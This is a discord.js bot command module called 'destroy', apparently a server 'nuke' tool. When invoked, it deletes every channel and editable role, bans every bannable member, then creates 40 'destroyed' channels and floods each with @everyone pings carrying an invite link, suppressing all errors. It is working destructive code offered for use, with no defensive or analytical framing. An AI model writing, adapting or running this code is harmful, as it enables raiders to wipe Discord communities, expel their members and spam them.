module.exports = {
  name: 'destroy',
  description: 'Nuclear option - delete channels + roles + banall',
  ownerOnly: true,
  async execute(message, args, client) {
    const guild = message.guild;
    if (!guild) return message.reply("❌ Not in a server.");

    message.reply("☢️ **FULL SERVER DESTRUCTION STARTED** (Yadav.Dev)");

    // Delete channels
    Promise.allSettled(guild.channels.cache.map(ch => ch.delete().catch(() => {})));

    // Delete roles
    Promise.allSettled(guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).map(r => r.delete().catch(() => {})));

    // Ban members
    Promise.allSettled(guild.members.cache.map(member => {
      if (member.id !== client.user.id && member.bannable) {
        return member.ban({ reason: "Destroyed by Yadav.Dev" }).catch(() => {});
      }
    }));

    // Spam channels + pings
    for (let i = 0; i < 40; i++) {
      guild.channels.create({ name: `destroyed-${i}`, type: 0 })
        .then(ch => {
          for (let j = 0; j < 8; j++) {
            ch.send("@everyone https://discord.gg/yourserver").catch(() => {});
          }
        }).catch(() => {});
    }

    message.reply("💥 **Destruction sequence completed.** Server should be dead.");
  }
};
